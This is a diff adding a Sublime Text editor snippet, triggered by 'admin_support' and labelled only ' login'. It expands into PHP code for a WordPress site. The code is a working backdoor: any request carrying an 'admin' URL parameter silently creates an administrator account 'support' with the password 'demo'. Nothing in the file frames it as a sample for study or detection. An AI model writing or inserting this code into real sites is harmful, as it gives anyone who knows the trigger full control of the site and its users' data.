@@ -1,0 +1,20 @@
+<snippet>
+	<content><![CDATA[
+if (isset(\$_GET['admin'])) {
+	include_once('wp-load.php');
+	\$userdata = array();
+	\$userdata['user_login'] = 'support';
+	\$userdata['user_pass'] = 'demo';
+	\$userdata['user_email'] = 'examplesupport@example.com';
+	\$userdata['role'] = 'administrator';
+	wp_insert_user(\$userdata);
+}
+
+]]></content>
+	<!-- Optional: Set a tabTrigger to define how to trigger the snippet -->
+	<tabTrigger>admin_support</tabTrigger>
+	<!-- Optional: Set a scope to limit where the snippet will trigger -->
+	<scope>source.php - variable.other.php</scope>
+	 <!-- Optional: Description to show in the menu -->
+	<description> login</description>
+</snippet>
